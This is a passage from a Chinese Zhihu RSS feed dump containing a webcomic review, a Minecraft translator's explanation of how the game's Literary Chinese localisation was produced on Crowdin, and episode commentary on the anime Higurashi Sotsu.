data-private-watermark-src=\"\"></p>\n<p>另外，除了此方世界外，上界的神明其实也是以六位圣人为首的；不知道是否对应大千世界的六道；</p>\n<hr>\n<h2><b>个人感想</b></h2>\n<p>说点自己的想法：传武其实诞生在一个比较特殊的时期，网络漫画慢慢开始正规化，但是读者还没有完全适应网络漫画的阅读习惯；这应该也是早期《传武》剧情节奏问题的原因之一，不过反过来说，很幸运，看到《传武》一直连载到现在；不论从画风上的不断进化还是故事上的不断丰富，都可以看成这一个特殊历史时期的缩影，传武见证了网络漫画进入一个更好的时代；（下图为传武早期海报）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3a6a3afd84ebc745509f746f6ec880c4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"1195\" data-watermark=\"watermark\" data-original-src=\"v2-3a6a3afd84ebc745509f746f6ec880c4\" data-watermark-src=\"v2-3403f26c2f74711a0d19196b0cde9884\" data-private-watermark-src=\"v2-91d4f3fec6ed63e36141d65f7d99aeac\"></p>\n<p>《传武》正和他故事中的角色一样，是一部不断在成长的漫画；叙事上现在的《传武》不仅敢玩梦中梦这样复杂的套路，还非常善于把不同的场景穿插着推进；作画上《传武》的进步更是有目共睹的；希望《传武》未来也能想如今这样不断的进化成长，也希望这么一部优秀的漫画能被更多人看到；（下图为传武第二部海报）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2f87b8bce90dbe1af9f7df75dde38f55_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1745\" data-watermark=\"watermark\" data-original-src=\"v2-2f87b8bce90dbe1af9f7df75dde38f55\" data-watermark-src=\"v2-98bde04621e3c746852bcac3e0ed3b51\" data-private-watermark-src=\"v2-c261ffb13200bdc31cdaf225b90ae3b7\"></p>\n<p><br></p>\n<a href=\"https://zhuanlan.zhihu.com/p/386792682\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-4a266d6d79ceb8f3e1eac1b9e445fd0a_bh.jpg\" data-image-width=\"1118\" data-image-height=\"563\" class=\"internal\">呆呆兽星君：《传武》红尘仙</a><p>感谢您的阅读~<br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wang-yixiang-68-33?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">呆呆兽星君</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/397486086/answer/1982744764?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">21 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/471871092?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怎么看漫画《传武》第二部第260条？</a><br><a href=\"http://www.zhihu.com/question/384869484?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怎么评价漫画《传武》？</a><br>\n","link":"http://www.zhihu.com/question/397486086/answer/1982744764?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何看待游戏《我的世界》（Minecraft）1.17.1 pre2 版本加入了文言文？","date":"2021-07-06 03:00:12","description":"\n<p>大家好，我是Minecraft文言语言的校对员ff98sha。</p>\n<p>前些天Minecraft文言语言上线了，借此机会写个回答和大家说说，Minecraft的翻译到底是个什么流程。关于文言翻译的来龙去脉可以先看看<a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/read/cv11957511%3Ffrom%3Dsearch\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">项目创始人的话</a>。</p>\n<h2>语言的增减</h2>\n<p>在Minecraft Java版1.1时代，游戏还只有36种<a href=\"http://link.zhihu.com/?target=https%3A//minecraft.fandom.com/zh/wiki/%25E8%25AF%25AD%25E8%25A8%2580\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">语言</a>，到了1.17.1便增长到了111种。近几年的语言申请是在<a href=\"http://link.zhihu.com/?target=https%3A//crowdin.com/project/minecraft/discussions/1386\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Crowdin上的一个话题/表格</a>中申请的，可以在这上百层楼中看到有许多语言正等候加入游戏。Cuervo在2020年向Mojang提交了<a href=\"http://link.zhihu.com/?target=https%3A//crowdin.com/project/minecraft/discussions/1612\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">文言申请</a>，并在2021年初被通过。因此文言并不特殊，至少和克林贡语比起来（</p>\n<p>语言申请通过之后，Mojang会在这两个项目中开放该语言的翻译。当语言的翻译和校对进度达到一定百分比时，Mojang就会在定期的排查中将此语言加入到游戏中。例如，文言在正式加入游戏时，校对进度为56%。</p>\n<p>因此新语言要正式加入游戏，除了审批外，至少需要翻译和校对2000多个词条（约8000多个单词）。在Crowdin上Mojang开放了140个语言的翻译，但在1.17.1中仅有111个语言。剩下的那些语言中除了尚未上线过的，还有因为长期无人维护（而字符串又在不断增加）导致翻译进度很低，而从游戏中移除的（如这次移除的马恩岛语）。</p>\n<p><b>所以，各位看到的文言语言其实是尚未完工的。</b>在上线之前我们也没有得到任何的通知。于是乎，大家就会各种吐槽某些翻译有问题……</p>\n<p>自从看到b站的某介绍MC文言视频热度飙升，我们就紧急联系了许多up主，他们也在视频里介绍了“文言语言由玩家翻译，尚未完工，轻喷”的情况。不过大多数人还是以为这是Mojang官方整的烂活（</p>\n<p><img src=\"https://pic1.zhimg.com/v2-660a1678869f20a12e08662e87647ddf_720w.jpg?rss\" data-caption=\"然未校者十之有四，請恕其拙。\" data-size=\"normal\" data-rawwidth=\"559\" data-rawheight=\"427\" data-watermark=\"watermark\" data-original-src=\"v2-660a1678869f20a12e08662e87647ddf\" data-watermark-src=\"v2-304f578c38ec5da9809e0a3a7f6e68ee\" data-private-watermark-src=\"\"></p>\n<h2>翻译流程</h2>\n<p><b>Minecraft Java版的翻译全由社区完成</b>，其他版本由专门团队完成，在此不做讨论。</p>\n<p>Minecraft所在的翻译平台叫做<a href=\"http://link.zhihu.com/?target=https%3A//crowdin.com/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Crowdin</a>（<a href=\"http://link.zhihu.com/?target=https%3A//zh.crowdin.com/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">中文版</a>），Mojang开设了<a href=\"http://link.zhihu.com/?target=https%3A//crowdin.com/project/minecraft\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Minecraft</a>本体和<a href=\"http://link.zhihu.com/?target=https%3A//crowdin.com/project/minecraft-launcher\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Minecraft Launcher</a>两个项目。</p>\n<p>任何人都可以注册一个Crowdin账号，然后申请加入Minecraft项目。申请通过后就可以选择某个语言开始翻译了。</p>\n<p>普通用户的身份是译者，可以翻译词条，也可以对其他用户提交的翻译进行赞和踩。</p>\n<p>翻译后校对员会对译文进行校对。校对员是由Mojang钦定的、有能力管理语言翻译的译者。目前简体中文的校对员是Cuervo和Powup333，文言的校对员是Cuervo和ff98sha。</p>\n<p>对于有大问题/已经核对的翻译，可以在右侧评论区提出一个问题（issue），并自动提醒校对员重新审查。</p>\n<p>有时候可能会看到有两个完全一样的翻译存在，这是因为校对员使用了全局替换功能，替换了所有翻译中的某个字符串。</p>\n<h2>翻译实装</h2>\n<p>在每两个快照发布前，Mojang会将Crowdin平台上的翻译下载后打包进游戏中。在这个过程中，会自动选择已翻译已校对的翻译。<b>对于已翻译未校对的翻译，则会自动选择Crowdin上排序靠前的翻译。翻译会按照得票数多少从高到低排，平票的按照时间顺序，新提交的会排在前面。</b></p>\n<p><b>于是，就导致了并未校对的译名加入游戏。</b>大家看到的半成品文言就充满了译名不统一、质量差、简繁混用、字形不统一等校对过程中需要解决的问题。当年的雷石东也是因为这个原因而出现的。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-863fcec1ced8c947a61b20cb7c55d2fc_720w.png?rss\" data-caption=\"我知道你们在找什么\" data-size=\"normal\" data-rawwidth=\"657\" data-rawheight=\"668\" data-watermark=\"watermark\" data-original-src=\"v2-863fcec1ced8c947a61b20cb7c55d2fc\" data-watermark-src=\"v2-1f34ce367420136a9e9e7c23b6060819\" data-private-watermark-src=\"v2-ee8dbc913b3023e53562c0780055fe5b\"></p>\n<p>大家会注意到，有时在启动已下载过的版本之前，依旧会从Mojang服务器重新下载游戏资源文件。这大多是翻译文件的更新。一般来说，Mojang会维护最新两个大版本的翻译。这也是为什么你在1.16.5也能看到文言选项。</p>\n<h2>关于翻译组</h2>\n<p><i>独家爆料：文言翻译组内竟没有一个古人！</i></p>\n<p>Minecraft文言的翻译组是2020年2月建立的，直到2021年1月21号文言上线Crowdin，翻译进度还是很惨淡。</p>\n<p>我赶在寒假和几次节假日/周末，在群内组织了多次讨论，确定了一部分词汇的译法，但想赶在1.17发布前完成校对的愿望还是过于美好。直到4月底，翻译进度为98%，校对进度仅为14%。五一假期及之后猛肝了一波，最终在5月中旬，校对进度突破了58%。</p>\n<p>有人推荐我们参考《汉典》等专业书。没错，我们都用到了，纸质和线上的资源。很少有应用或游戏会有文言翻译，所以我们的基本无从借鉴。但我能确定，游戏中已校对的翻译，几乎都能在讨论群里找到几十条关于其的讨论，这些翻译大都是我们尽力考证过争辩后得出的。</p>\n<p><b>我们是普通玩家，但我们真的有用心整活。</b></p>\n<p>如果有古汉语专业的玩家，请速联系我们，不胜荣幸。</p>\n<h2>其他</h2>\n<p>中文Minecraft Wiki积极参与了Minecraft简体中文版本的翻译。其中主要参与者Craft Lawrence、Powup333和Sjjklh有幸被官方赠予印有中国国旗的特殊翻译者披风。同时这三名成员也获得了简体中文版本的校对员资格，并维护简体中文版本的翻译至2018年。</p>\n<p>文言语言使用繁体是为了承古风。</p>\n<p>文言在语言列表的中间是因为其ISO 639-3代码为lzh（Literary Chinese）。</p>\n<p>2021年7月6日发布了1.17.1正式版，我们这周修改了大量问题，新的翻译已实装到此版本，欢迎体验。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-28630ad281f5956da3d632a5e6ee01da_720w.jpg?rss\" data-caption=\"蜜脾块，确信\" data-size=\"normal\" data-rawwidth=\"340\" data-rawheight=\"166\" data-watermark=\"watermark\" data-original-src=\"v2-28630ad281f5956da3d632a5e6ee01da\" data-watermark-src=\"v2-407ec565a6a0ff6f0dab9e5aa6e5a757\" data-private-watermark-src=\"v2-5a520f5c85cef1b9e53be6fbf7006c05\"></p>\n<p>最近一周一直在努力校对词条，并收集玩家的反馈建议。感谢各位玩家的支持与指正，我们会继续整个文化自信的好活。</p>\n<p>对于文言翻译的建议以及加入翻译组的申请，可以评论本回答或私聊我。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ff98sha?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">ff98sha</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/469226186/answer/1979682825?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">62 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/26584294?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">微软会不会把 Minecraft 换引擎重制一遍？</a><br><a href=\"http://www.zhihu.com/question/406965213?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">朋友开了我的世界中国版本地联机房并加了些mod，我收到存档后，导入单人显示forge mod什么的?</a><br>\n","link":"http://www.zhihu.com/question/469226186/answer/1979682825?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价2021年7月开播的动画《寒蝉鸣泣之时 卒》？","date":"2021-07-05 11:30:09","description":"\n<p>终于等到《卒》了！继续分集评析，一周一更。</p>\n<p>关于《业》的分集解读请看这里：</p>\n<a href=\"https://www.zhihu.com/question/423143915/answer/1513310105\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-c9329c58a0897eeec4285a4ee7605796_bh.jpg\" data-image-width=\"2880\" data-image-height=\"1800\" class=\"internal\">如何评价2020年10月开播的动画《寒蝉鸣泣之时》？</a><p><br></p>\n<p>关于《卒》的一些基本认识：《卒》是解题篇，一共十五集，而第一篇的《鬼明篇》是《鬼骗篇》的解答，所以这样子来看前三篇都是对《业》中前三篇的解答，一定程度上也分别对应《解》中的前三篇。顺带一提，鬼明篇的前两话其实是一起放送的，只不过第一话在1号11：30半放送，第二话则是在2号零点开始。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-098eacb3f028b4f8b9c11bde5c0768d9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"826\" data-rawheight=\"394\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h2><b>7.1 鬼明篇：其一</b></h2>\n<p>• 鬼明篇的开头与鬼骗篇一致，但从一些细节中可以看出，我们观剧的视角发生了翻转，于是本篇中我们是从作为黑幕的沙都子和礼奈的角度来看待整个故事的。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-26bcf64e7034552b19e4d497fb0dde0c_720w.jpg?rss\" data-caption=\"在鬼骗篇同款opening sequence之后，追加了沙都子的独白\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 本篇很明显能看出《罪灭篇》的成分：礼奈的父亲遭遇间宫莉娜、礼奈开始回想过去的的不幸以及自己从礼奈变成蕾娜的契机，这些都是罪灭篇的基本配置。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c18235e6a24b16838266fa9f7737ecea_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-bc2f61eaf9c4c5ab14b41da730267719_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-4db6ace9f6ab0999a10d13a3b57ae505_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 本作承袭《业》中的「镜像翻转」要素，在一些场景中以镜像作为暗示，譬如下图中的沙都子，在窗户中的倒影是轮回者状态。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-9139a72234ba4392fabb407fd703504b_720w.jpg?rss\" data-caption=\"注意眼睛\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 本集中明确了骗篇的凶手应该都是因为沙都子的注射而发病的，而结合铁平与下一集的莉娜，此处有一种可能，那就是在业力的影响下，各个碎片的凶手和发病者都会主动去回避曾经的错误，导致每个碎片在不被沙都子干涉的情况下都可以走向幸福的结局。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c6c7c163b68a3b42dd8b9e32cecfdb01_720w.jpg?rss\" data-caption=\"沙都子为礼奈施打药物\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-e66175e98e2283cdb92d47054126f0ae_720w.jpg?rss\" data-caption=\"礼奈睡得真沉...\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 礼奈在药物的影响下进入了发病的状态，并且不由自主地回想起来过去与母亲之间不愉快的回忆。值得一提的是，旧作里礼奈的父母应该都是没露脸的，不过本次倒是都老老实实地画了出来；礼奈母亲怀孕的细节得到了强调，不知道是否是在为与《命》的联动作铺垫（《命》主角之一的凤谷菜央是礼奈同母异父的妹妹，就是此处腹中的胎儿）。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-18597a2b0e80475fa0c41c3afe6783b7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-63f88057c539856b55de5204c306cb65_720w.jpg?rss\" data-caption=\"跟小学生说这种话，真的大丈夫？\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 礼奈发病后有大量自言自语的场景，这虽然显得有点解说性过强，但配合发病时的癫狂来看还挺带感的。不得不说，本作里对于lv5状态时的疯狂姿态描绘得非常好，观赏性要远大于旧作。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-26fac28c9f9bd2520381890a611c0857_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-1c6d87f1e76cbb5ad7a66be55cbbd160_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-64dd7121ee7797f1a521b335cc4cc52a_720w.jpg?rss\" data-caption=\"这张礼奈好可爱啊\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 和铁平相似，这个碎片中的莉娜也开始良心发现，从一开始就没有作恶的动机。所以本篇本来可以走向一个幸福的结局（毕竟铁平和鹰野也不会搞事），但在沙都子的介入下被破坏了。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d8d85ac1317e8086fbe437c4a170ba2d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-937215a84c1fe9206bf08da9dae4ae6a_720w.jpg?rss\" data-caption=\"这样的莉娜很少见，令我对原本纯黑的她产生了一丝怜悯\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<h2>7.2 鬼明篇：其二</h2>\n<p>（因为这集还没中文资源，所以只能在Hulu上一边看一边用手机拍照了）</p>\n<p>• 礼奈开始进行谋杀的准备，恰好碰上莉娜自己找上门来。值得一提的是，似乎是为了映衬礼奈的这种癫狂状态，这个夕阳西下的场景里，配色也有一种妖异的感觉，让人想起了「さよならを教えて」。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c321cd23d70fc86963ca366ccfe1a839_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-b46f6f2738d44d873e6ad4ec1e1cb2f2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 在礼奈的秘密据点内，莉娜想要对她敞开心扉，结果被发狂的礼奈袭击。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-af526b91b19f2f8dd39568ef24a97cfb_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-7b608ed7a23bb0a2edbb61d7f5cdba13_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 不得不说，礼奈在本集的发狂场景作画非常不错，狂乱之余，不失魄力。值得一提的是，因为注射所导致的发病状态，似乎和自然发病是存在区别的，譬如这里的礼奈就比罪灭篇要更具有侵略性。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-218a4a0c805471ce119db135ce3bc1e7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-bd17c04b14768e58db01b7533cb68a1b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-b17a0efba457fe5d118de8b80644d5f3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 沙都子就在案发现场的山坡上远远观望，此处的构图与《业》第一集时梨花俯瞰圭一的场景一模一样，再度强调了立场和视角的反转。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c105c778c1df125d3dd7127431ba487e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-3da66c9dfc57c0fbea3f7e2b2addd5d5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 第二天，试图在垃圾山继续处理尸体的礼奈，碰上了追寻她而来的圭一，并开始疑神疑鬼。这个疑心状态下的礼奈，在其表情的描绘上，风格比较写实化，因而产生了一种奇妙的反差，个人非常喜欢。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9fb706752e6089cd73ea00023cccad8b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-4ab20761a812eb0b858733971132acb5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 礼奈在回家的路上遇见了大石，得知警方在调查间宫莉娜的失踪，因而承受了更多的精神压力。不过，即使是在这样的状态下，她也没有让大石看出破绽，可见礼奈的自制能力和冷静程度都非常可怕。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-39239679db952d647229cab7b2c46303_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<h3>关于前两集的简评</h3>\n<p>• 相较于《业》来说，《卒》的前两集可以说是照常发挥，各方面延续了《业》的特点以外，也继承了「新内容+剧情复盘」的模式，可见制作方对《卒》仍旧抱有拉新观众入坑的期望。</p>\n<p>• 可能是为了与《业》对接，《卒》中有不少直接从《业》里照搬的段落和画面，不过也许是因为这一点节省了开支，所以在新场面的描绘上有了更好的发挥，譬如这两集中礼奈发病的场面。</p>\n<p>• 结合《乡坏篇》和《鬼明篇》来看，出题篇之所以命名为《业》，大概是因为每个角色都要为自己曾经的罪业付出代价，因而与为自己所拖累的人进行了位置的转换，从被害者变成了加害者，所以之后的绵明篇和祟明篇大概也是类似的走向。</p>\n<p>• 总觉得《卒》的画风好像变得更顺眼了，不知道是因为自己看习惯了，还是绘柄真的变了，总觉得之前的那种肥而圆的感觉好像没有那么明显了。</p>\n<h2>7.8 鬼明篇：其三</h2>\n<p>• 这集不论是节奏还是作画方面都像是个总集篇... 少量的新画面加上大量从业照搬过来的旧画面，算是把鬼骗篇后续的一部分给解答了，但是这些解释并不是非常令人满意。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-64023df551e60de323cbb11487cefa62_720w.jpg?rss\" data-caption=\"而且一部分新画面相当敷衍，甚至可以说是崩坏\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-64023df551e60de323cbb11487cefa62\" data-watermark-src=\"v2-21342095da46a7d35450a2cba9278f83\" data-private-watermark-src=\"v2-689421da7406883137268c1ac6b1d876\"></p>\n<p><br></p>\n<p>• 鬼骗篇最令人好奇的地方就在于礼奈刺杀圭一前后的一系列细节，但是这一部分在鬼明篇中占的篇幅非常至少，而且并没有什么令人震惊的真相 —— 礼奈的发疯是切实的，而且直到最后也没有从lv5状态中恢复（这似乎意味着注射导致的发病是无法解除的，因为礼奈有过数次从lv5状态自愈的案例），而圭一也并没出现幻觉，仅仅是在最后发病了而已。</p>\n<p>• 本集的经典表情合集：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-5c9f630dec0dd85b231222040721a488_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-5c9f630dec0dd85b231222040721a488\" data-watermark-src=\"v2-a7779161a14349a9a8925ddc8fe490c7\" data-private-watermark-src=\"v2-b35f55b4132c5374e47d5a4d82f7f44f\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-d1821941d69b0bcf07a00138d09fe8e0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-d1821941d69b0bcf07a00138d09fe8e0\" data-watermark-src=\"v2-a656b6dddb14ab8c6093b7e1e0884590\" data-private-watermark-src=\"v2-88b3d5d730b76a6115b286eef3db91a1\"></p>\n<p><br></p>\n<p>• 梨花被打脸合集：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ac047fd27ba348a349f7b65a93875a13_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-ac047fd27ba348a349f7b65a93875a13\" data-watermark-src=\"v2-06aefcb0a2356be82919099857216601\" data-private-watermark-src=\"v2-8ff8e57facab1a4f7d12fc09f17963e6\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-7b724c5925a558e0920221a6d54a1f9f_720w.jpg?rss\" data-caption=\"严格来说也没错，圭一确实靠闹钟打赢了菜刀，一战（再度）成名\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-7b724c5925a558e0920221a6d54a1f9f\" data-watermark-src=\"v2-606ee783a3b4d9cb5225e7d803f55075\" data-private-watermark-src=\"v2-228f9b162563fccbc677f11a041dca3c\"></p>\n<p><br></p>\n<p>• 梨花和沙都子还真就是先后自杀：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-59c3928e9554b056673b3a7622ca7e03_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-59c3928e9554b056673b3a7622ca7e03\" data-watermark-src=\"v2-d0077419112df79495aabee48cf0b49d\" data-private-watermark-src=\"v2-271036a6ddcaaa571ada13d5a7efc297\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-ae02b41d08370377b0ba97917acf57ae_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" 